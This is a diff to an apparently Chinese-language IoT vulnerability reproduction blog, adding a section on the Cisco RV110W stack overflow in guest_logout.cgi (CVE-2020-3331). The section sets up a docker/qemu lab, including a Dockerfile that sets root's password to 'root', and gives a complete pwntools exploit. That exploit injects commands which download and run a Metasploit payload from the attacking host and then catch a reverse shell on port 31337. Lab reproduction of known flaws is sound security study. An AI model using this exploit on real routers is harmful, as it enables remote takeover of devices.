@@ -77,6 +77,7 @@
 <p>- <a href="#TOTOLINK">TOTOLINK NR1800X (CVE-2022-41518)</a></p>
 <p>- <a href="#VIVOTEK">Vivotek CC8160 栈溢出漏洞</a></p>
 <p>- <a href="#HG532">华为 HG532 远程代码执行漏洞（CVE-2017-17215）</a></p>
+<p>- <a href="#CISCO">Cisco RV110W 远程代码执行漏洞（CVE-2020-3331）</a></p>
 <h1 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建 "></a>环境构建 <a id="env"></a></h1><p><a target="_blank" rel="noopener" href="https://wsxk.github.io/IotVulhub/">IoT-vulhub 漏洞复现 – wsxk’s blog – 小菜鸡</a></p>
 <p><a target="_blank" rel="noopener" href="https://brvc3.github.io/2023/03/15/IoT-Vulhub%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">IoT-Vulhub基础环境搭建 | Brvc3’s Base</a></p>
 <p>docker拉取问题解决：<a target="_blank" rel="noopener" href="https://github.com/DaoCloud/public-image-mirror?tab=readme-ov-file">https://github.com/DaoCloud/public-image-mirror?tab=readme-ov-file</a></p>
@@ -322,6 +323,115 @@ log.success(<span class="string">&quot;getshell&quot;</span>)
 io.interactive()
 
 thread.join()</code></pre>
+
+
+
+<h1 id="Cisco-RV110W-远程代码执行漏洞（CVE-2020-3331）"><a href="#Cisco-RV110W-远程代码执行漏洞（CVE-2020-3331）" class="headerlink" title="Cisco RV110W 远程代码执行漏洞（CVE-2020-3331）"></a>Cisco RV110W 远程代码执行漏洞（CVE-2020-3331）<a id="CISCO"></a></h1><p>难题的复现找来找去只有那么几位师傅</p>
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">思科路由器 RV110W CVE-2020-3331 漏洞复现 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-271900.htm">原创]Cisco RV110W 远程代码执行漏洞分析(CVE-2020-3331)-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
+<p>思科无线路由器，</p>
+<h2 id="漏洞环境-3"><a href="#漏洞环境-3" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
+<li>docker：攻击、调试主机：192.168.2.1</li>
+<li>qemu-system：固件主机：192.168.2.2</li>
+<li>httpd（有漏洞 Web 服务器）：192.168.2.2:80</li>
+<li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mipsel</code></li>
+</ul>
+<h2 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>解压固件</p>
+<blockquote>
+<p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;RV110W_FW_1.2.2.5.bin”</p>
+</blockquote>
+<p>构建启动环境</p>
+<blockquote>
+<p>.&#x2F;init_env.sh mipsel</p>
+<p>docker-compose -f docker-compose-system.yml build</p>
+<p>docker-compose -f docker-compose-system.yml up</p>
+</blockquote>
+<p>docker内进行端口转发(Docker-compose.yml中写好了端口映射)</p>
+<blockquote>
+<p>ssh <a href="mailto:&#x72;&#x6f;&#111;&#x74;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#x31;">&#x72;&#x6f;&#111;&#x74;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#x31;</a> -f -N -g -R 0.0.0.0:6666:192.168.2.2:6666</p>
+<p>ssh <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#49;&#50;&#x37;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#49;">&#x72;&#x6f;&#111;&#116;&#64;&#49;&#50;&#x37;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#49;</a> -f -N -g -R 0.0.0.0:80:192.168.2.2:80</p>
+</blockquote>
+<p>nmap可以扫到服务  8888–漏洞服务    6666–gdbserver</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262320963.png" alt="image-20240626231935303"></p>
+<p>运行exp，打通</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262355451.png" alt="image-20240626235453453"></p>
+<p>断开后服务会down，需要重新up才能起来</p>
+<p>调试配置</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271159313.png" alt="image-20240627115953109"></p>
+<h3 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h3><p>内置的gef插件无法正常加载–原因为gdb与python版本较低</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270002901.png" alt="image-20240627000252848"></p>
+<p>官方手册</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270004520.png" alt="image-20240627000444482"></p>
+<p>要求GDB 8.0以上，Python3.6+，修改更麻烦了，干脆不装gef了，把gef哪行注释掉</p>
+<pre><code class="highlight Dockerfile"><span class="keyword">FROM</span> firmianay/ubuntu1604                                                                                                                
+<span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;firmianay@gmail.com&quot;</span>                                                                                                       </span>
+                                                                                                                                         
+<span class="keyword">WORKDIR</span><span class="language-bash"> /root                                                                                                                            </span>
+                                                                                                                                         
+<span class="keyword">RUN</span><span class="language-bash"> apt-get update \                                                                                                                     </span>
+    &amp;&amp; apt-get install -y qemu-system-mipsel \                                                                                           
+    &amp;&amp; apt-get install -y --no-install-recommends bridge-utils uml-utilities expect gdb-multiarch git python3-dev openssh-server netcat curl libssl-dev libffi-dev build-essential tcpdump \                                                                                      
+    &amp;&amp; sed -i <span class="string">&quot;s/PermitRootLogin prohibit-password/PermitRootLogin yes/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; echo <span class="string">&quot;root:root&quot;</span> | chpasswd &amp;&amp; echo <span class="string">&quot;GatewayPorts yes&quot;</span> &gt;&gt;  /etc/ssh/sshd_config \                                                                                               
+   <span class="comment"># &amp;&amp; git clone --depth=1 https://github.com/hugsy/gef.git \   </span>
+    &amp;&amp; git clone --depth=<span class="number">1</span> https://github.com/longld/peda.git ~/peda \
+   <span class="comment"># &amp;&amp; cp gef/gef.py ~/.gef.py &amp;&amp; echo &quot;source ~/.gef.py&quot; &gt; ~/.gdbinit &amp;&amp; echo &quot;export LC_CTYPE=C.UTF-8&quot; &gt;&gt; ~/.bashrc \    </span>
+    &amp;&amp; echo <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit &amp;&amp; echo <span class="string">&quot;export LC_CTYPE=C.UTF-8&quot;</span> &gt;&gt; ~/.bashrc \ 
+    &amp;&amp; python3 -m pip install --upgrade pwntools \                                                                                       
+    &amp;&amp; apt-get purge -y --autoremove git \                                                                                               
+    &amp;&amp; rm -rf /var/lib/apt/lists/* /root/gef                                                                                             
+                                                                                                                                         
+<span class="comment">#RUN mkdir images &amp;&amp; cd images \                                                                                                         </span>
+<span class="comment">#    &amp;&amp; wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2                                          </span>
+<span class="comment">#    &amp;&amp; wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta                                                    </span>
+                                                                                                                                         
+<span class="keyword">COPY</span><span class="language-bash"> ./images /root/images</span></code></pre>
+
+
+
+<h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本漏洞存在于CISCO RV110W-E-CN-K9（固件版本1.2.2.5），漏洞原因是cgi接口guest_logout.cgi中存在栈溢出漏洞，而因为mips本身不支持NX从而导致可以使用shellcode得到shell </p>
+<p>漏洞点 sscanf函数通过政策表达式将v11输入v29和v28中  其中v29存储的是分号前的所有字符，而v28存储的是不在分号后和等号前但在等号后换行符前的所有字符</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271205845.png" alt="image-20240627120518766"></p>
+<p>然后跟踪v11</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271207669.png" alt="image-20240627120718622"></p>
+<p>exp:</p>
+<p>msf生成的exp</p>
+<pre><code class="highlight python"><span class="comment">#!/usr/bin/python3</span>
+
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">import</span> requests
+<span class="keyword">from</span> threading <span class="keyword">import</span> Thread
+
+context(arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)
+
+system = <span class="number">0x0047A610</span>
+
+cmd  = <span class="string">&#x27;\n&#x27;</span>
+cmd += <span class="string">&#x27;wget http://192.168.2.1:8000/tools/msf -O /msf\n&#x27;</span>
+cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span>
+cmd += <span class="string">&#x27;/msf\n&#x27;</span>
+
+<span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">0x55</span>)
+
+payload = <span class="string">b&quot;status_guestnet.asp&quot;</span> + cmd.ljust(<span class="number">0x55</span>,<span class="string">&#x27;a&#x27;</span>).encode() + p32(system) 
+data = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>, <span class="string">&quot;submit_button&quot;</span>:payload, <span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.100.1&quot;</span>&#125;
+
+<span class="keyword">def</span> <span class="title function_">attack</span>():
+    <span class="keyword">try</span>:
+        requests.post(<span class="string">&quot;http://192.168.2.2/guest_logout.cgi&quot;</span>, data=data, timeout=<span class="number">1</span>)
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        <span class="built_in">print</span>(e)
+
+thread = Thread(target=attack)
+thread.start()
+
+io = listen(<span class="number">31337</span>)
+io.wait_for_connection()
+log.success(<span class="string">&quot;getshell&quot;</span>)
+io.interactive()
+
+thread.join()</code></pre>
+
+
 
 
 
